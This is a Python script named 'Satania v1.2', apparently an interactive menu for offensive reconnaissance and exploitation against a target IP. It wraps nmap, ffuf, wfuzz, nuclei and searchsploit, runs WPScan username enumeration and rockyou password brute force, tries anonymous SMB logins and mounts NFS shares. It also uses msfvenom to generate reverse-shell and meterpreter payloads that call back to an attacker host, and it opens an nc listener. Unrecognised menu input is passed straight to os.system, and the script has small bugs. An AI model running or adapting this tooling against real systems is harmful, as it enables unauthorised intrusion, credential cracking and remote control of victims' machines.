#!/bin/python3

import time
import sys
import os
import readline
#import tab

a = os.path.exists("/home/satania/satania.py")

if(a != True):
	print("")
	print("\033[1;31;40mError:\033[0m satania.py is not in the folder, please manually move satania.py to the `/hoem/satania/`")
	exit()

start = 0
frequency = 0
num1 = "1"
num2 = "2"
num3 = "3"
num4 = "4"
num5 = "5"
num6 = "6"
num7 = "7"
num8 = "8"
num9 = "9"
num10 = "10"
num11 = "11"
num12 = "12"
num13 = "13"
num14 = "14"
num15 = "15"
num16 = "16"
num17 = "17"
num18 = "18"
num19 = "19"
num20 = "20"

#os.system("service apache2 start")
print("")
#print("-----------------------------------------------------")
print("\033[1;31;40m ____        _              _       \033[0m")
print("\033[1;31;40m/ ___|  __ _| |_ __ _ _ __ (_) __ _ \033[0m")
print("\033[1;31;40m\___ \ / _` | __/ _` | '_ \| |/ _` |\033[0m")
print("\033[1;31;40m ___) | (_| | || (_| | | | | | (_| |\033[0m")
print("\033[1;31;40m|____/ \__,_|\__\__,_|_| |_|_|\__,_|\033[0m    v1.2")
print("")
print("")
#print("-----------------------------------------------------")
time.sleep(0.6)
start4 = 0
frequency4 = 0
back = "back"
n = "next"

def wpscan_menu():
	print("")
	print("\033[1;31;40m########## WPScan Enumeration Modular ##########\033[0m")
	print("1.WPScan Vulnerability Scanning")
	print("2.WPScan Username Enumeration")
	print("3.WPScan Cipher Blasting")
	print("")

def menu():
	print("")
	#print("-----------------------------------------------------")
	print("\033[1;31;40mTarget IP: \033[0m" + rhost)
	print("")
	print("\033[1;31;40m########## Nmap Enumeration ##########\033[0m")
	print("1.Nmap Scan")
	print("2.Nmap Vulnerability Scan")
	print("3.Nmap Intranet Scanning")
	print("")
	print("\033[1;31;40m########## Website Enumeration ##########\033[0m")
	print("4.Website Directory Enumeration")
	print("5.Website Subdomain Name Enumeration")
	print("6.Website Framework Enumeration")
	print("7.WPScan Enumeration Modular")
	print("")
	print("\033[1;31;40m########## SMB Enumeration ##########\033[0m")
	print("8.SMB Shared File Probe")
	print("9.SMB Anonymous Login")
	print("10.SMB Connection Specified folder")
	print("11.SMB Connection Specified username")
	print("")
	print("\033[1;31;40m########## NFS Enumeration ##########\033[0m")
	print("12.NFS Scan")
	print("13.NFS File Mount")
	print("")
	print("\033[1;31;40m########## shellcode ##########\033[0m")
	print("14.Msfvenom Generate Shellcode")
	print("15.Access Shellcode")
	print("")
	print("\033[1;31;40m########## Other ##########\033[0m")
	print("16.Change Target IP")
	print("17.Searchsploit")
	print("18.Reacquire IP address")
	print("19.Exit")
	print("")

def wpscan_scan():
	a = os.path.exists("/home/satania/api")

	if(a != True):
		print("")
		print("If there is no API Token, you can register on the `https://wpscan.com/`")
		api = input("\033[1;31;40mPlease enter wpscan API Token >\033[0m ")
		os.system("touch /home/satania/api")
		with open("/home/satania/api","w") as file:
			file.write(api)
		url = input("\033[1;31;40mPlease enter the full URL of the website > \033[0m")
		os.system("wpscan --url {} ".format(url)+"--api-token "+api)
	else:
		with open("/home/satania/api","r") as file:
			api = file.read()
		url = input("\033[1;31;40mPlease enter the full URL of the website > \033[0m")
		os.system("wpscan --url {} ".format(url)+"--api-token "+api)

def msfvenom():
		start8 = 0
		frequency8 = 0
		print("")
		print("Please enter the shell back connection IP address")
		lhost = input("\033[1;31;40mMsfvenom Generate Shellcode@Pleas Enter lhost >\033[0m ")
		print("")
		print("Please enter the shell back connection PORT")
		lport = input("\033[1;31;40mMsfvenom Generate Shellcode@Pleas Enter lport >\033[0m ")
		while start8 == frequency8:
			try:	
				print("")
				print("\033[1;31;40mLHOST: \033[0m" + lhost)
				print("\033[1;31;40mLPORT: \033[0m" + lport)
				print("")
				print("\033[1;31;40m########## Msfvenom Generate Shellcode ##########\033[0m")
				print("1.aspx shellcode")
				print("2.php shellcode")
				print("3.exe shellcode" + "(M)")
				print("4.Netcat Listening Port")
				print("5.Change lhost and lport")
				print("")
				
				num = input("\033[1;31;40mPleas Enter the option >\033[0m ")
				
				if num in (num1,num2,num3,num4,num5):
				
					if(num == num1):
						os.system("msfvenom -p windows/x64/shell_reverse_tcp lhost={} ".format(lhost) + "lport={} ".format(lport) + "-f aspx -o shellcode.aspx")
						print("")
						print("Payload is : windows/x64/shell_reverse_tcp")
						print("\033[1;31;40mshellcode.aspx\033[0m")
						os.system("pwd")
			
					elif(num == num2):
						os.system("msfvenom -p windows/x64/shell_reverse_tcp lhost={} ".format(lhost) + "lport={} ".format(lport) + "-f php -o shellcode.php")
						print("")
						print("Payload is : windows/x64/shell_reverse_tcp")
						print("\033[1;31;40mshellcode.php\033[0m")
						os.system("pwd")
						
					elif(num == num3):
						os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp lhost={} ".format(lhost) + "lport={} ".format(lport) + "-f exe -o shellcode.exe")
						print("")
						print("Payload is : windows/x64/meterpreter/reverse_tcp")
						print("\033[1;31;40mshellcode.exe\033[0m")
						os.system("pwd")		
				
					elif(num == num4):
						os.system("nc -nvlp {}".format(lport))
					
					elif(num == num5):
						print("")
						print("Please enter the shell back connection IP address")
						lhost = input("\033[1;31;40mPleas Enter lhost >\033[0m ")
						print("")
						print("Please enter the shell back connection PORT")
						lport = input("\033[1;31;40mPleas Enter lport >\033[0m ")
			
				elif(num == back):
					start8 = start8 + 1
				else:
					os.system(num)
				
			except:
				print("\nPlease enter `back` to return")
				
while start4 == frequency4:
	try:
		print("Please enter the IP address or `next`\n")
		rhost = input("\033[1;31;40mTarget ip >\033[0m ")

	except:
		print("")
		print("\nBye")

	if(rhost != n):
		nmapscan = "nmap -sS -sV -T4 -p- -oN scan.txt " + rhost
		os.system(nmapscan)
		start4 = start4 + 1
		
	else:
		rhost = ""
		start4 = start4 + 1
		
menu()

while start == frequency:
	
	number = input("\033[1;31;40mPleas Enter the option >\033[0m ")
	
	if number in (num1,num2,num3,num4,num5,num6,num7,num8,num9,num10,num11,num12,num13,num14,num15,num16,num17,num18,num19,num20):
		if(number == num1):
			os.system("nmap -sS -sV -T4 -p- -oN satania_scan.txt " + rhost)
			menu()
			
		elif(number == num2):
			os.system("nmap --script=vuln " + rhost)
			menu()
		
		elif(number == num3):
			start5 = 0
			frequency5 = 0
			while start5 == frequency5:
				try:
					print("")
					print("\033[1;31;40m########## Nmap Intranet Scanning ##########\033[0m")
					print("1.192.168.0.1/24")
					print("2.192.168.1.0/24")
					print("3.172.16.0.1/16")
					print("4.Custom range")
					
					print("")
					ra = input("\033[1;31;40mNmap Intranet Scanning@Pleas Enter the option >\033[0m ")
					if ra in (num1,num2,num3,num4):
						if(ra == num1):
							os.system("nmap -sP 192.168.0.1/24")
						elif(ra == num2):
							os.system("nmap -sP 192.168.1.0/24")
						elif(ra == num3):
							os.system("nmap -sP 172.16.0.1/16")
						elif(ra == num4):
							start6 = 0
							frequency6 = 0
							while start6 == frequency6:
								try:	
									ra = input("\033[1;31;40mPlease enter the scanning range >\033[0m ")
									if(ra != back):
										os.system("nmap -sP" + ra)
									else:
										start6 = start6 + 1
								except:
									print("\nPlease enter `back` to return")
						elif(ra == back):
							start5 = start5 + 1
					elif(ra == back):
						start5 = start5 + 1
					else:
						os.system(ra)
				except:
					print("\nPlease enter `back` to return")
				
		elif(number == num4):
			os.system("ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 100 -mc 200,302,301 -u http://{}/FUZZ".format(rhost))
			menu()
		
		elif(number == num5):
			os.system("wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --sc 200 -u http://{}/ -c -H 'Host:FUZZ.url' --hw 26".format(rhost))
			menu()
		
		elif(number == num6):
			os.system("nuclei -u http://{}".format(rhost))
			menu()
		
		elif(number == num16):
			print("")
			rhost = input("\033[1;31;40mTarget IP >\033[0m ")
		
		elif(number == num17):
			start2 = 0
			frequency2 = 0
			stri = "back"
			while start2 == frequency2:
				try:
					print("")
					searchsploit = input("\033[1;31;40mSearchsploit > \033[0m")
					if(stri != searchsploit):
						os.system("searchsploit " + searchsploit)
					else:
						start2 = start2 + 1
				except:
					print("\nPlease enter `back` to return")
		
		elif(number == num7):
			start9 = 0
			frequency9 = 0
			wpscan_menu()
			while start9 == frequency9:
				try:
					opt = input("\033[1;31;40mPleas Enter the option >\033[0m ")
					if opt in (num1,num2,num3):
						if(opt == num1):
							wpscan_scan()
							wpscan_menu()
						elif(opt == num2):
							url = input("\033[1;31;40mPlease enter the full URL of the website > \033[0m")
							os.system("wpscan --url {} ".format(url)+"-e u")
							wpscan_menu()
						elif(opt == num3):
							url = input("\033[1;31;40mPlease enter the full URL of the website > \033[0m")
							username = input("\033[1;31;40mPlease enter the Username > \033[0m")
							a = os.path.exists("/usr/share/wordlists/rockyou.txt")
							if(a == True):
								os.system("wpscan --url {} ".format(url)+"-U admin -P /usr/share/wordlists/rockyou.txt")
								wpscan_menu()
							else:
								url = input("\033[1;31;40mPlease enter the full URL of the website > \033[0m")
								os.system("tar -zxvf /usr/share/wordlists/rockyou.tar.gz")
								os.system("wpscan --url {} ".format(url)+"-U admin -P /usr/share/wordlists/rockyou.txt")
								wpscan_menu()
					elif(opt == back):
						start9 = start9 + 1
					else:
						wpscan_menu()
						os.system(opt)
						
				except:
					wpscan_menu()
					print("\nPlease enter `back` to return")
					
			menu()
			
			
		elif(number == num8):
			os.system("nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {}".format(rhost))
			os.system("smbclient -L //{}/".format(rhost))
			menu()
			
		elif(number == num9):
			os.system("smbclient //{}/anonymous".format(rhost))
		
		elif(number == num10):
			print("")
			print("Please enter a folder to connect to")
			folder = input("\033[1;31;40mSMB Connection Specified folder@folder >\033[0m ")
			os.system("smbclient //{}".format(rhost)+"/{}".format(folder))
			
		
		elif(number == num11):
			print("")
			print("Please enter a username to connect to")
			username = input("\033[1;31;40mSMB Connection Specified folder@username >\033[0m ")
			print("Please enter a folder to connect to")
			folder = input("\033[1;31;40mSMB Connection Specified folder@folder >\033[0m ")
			os.system("smbclient -U {} ".format(username)+"//".format(rhost)+"/{}".format(folder))
		
		elif(number == num12):
			os.system("nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {}".format(rhost))
			menu()
            
		elif(number == num13):
			start3 = 0
			frequency3 = 0
			strx = "back"
			while start3 == frequency3:
				try:
					print("")
					mount1 = input("\033[1;31;40mNFS File Mount@Please enter the destination folder to mount > \033[0m")
					if(mount1 == strx):
						start3 = start3 + 1
					else:
						mount1 = mount1
						if(mount1 == mount1):
							print("")
							mount2 = input("\033[1;31;40mNFS File Mount@Mounted local directory > \033[0m")
							if(mount2 == strx):
								start3 = start3 + 1
							else:
								mount2 = mount2
								if(mount2 == mount2):
									os.system("mount {}".format(rhost) + ":/{} ".format(mount1) + "/{}".format(mount2))
				except:
					print("\nPlease enter `back` to return")
					
		elif(number == num14):
			msfvenom()
		
		elif(number == num15):
			url = input("\033[1;31;40mAccess Shellcode@Please enter a full link to the website shellcode >\033[0m ")
			os.system("curl {}".format(url))
			menu()
			
		elif(number == num18):
			os.system("ifconfig eth0 up")
			os.system("dhclient eth0")
			os.system("ifconfig")
			menu()
		
		elif(number == num19):
			print("")
			print("Bye")
			start = start + 1 
			
	else:
		menu()
		os.system(number)

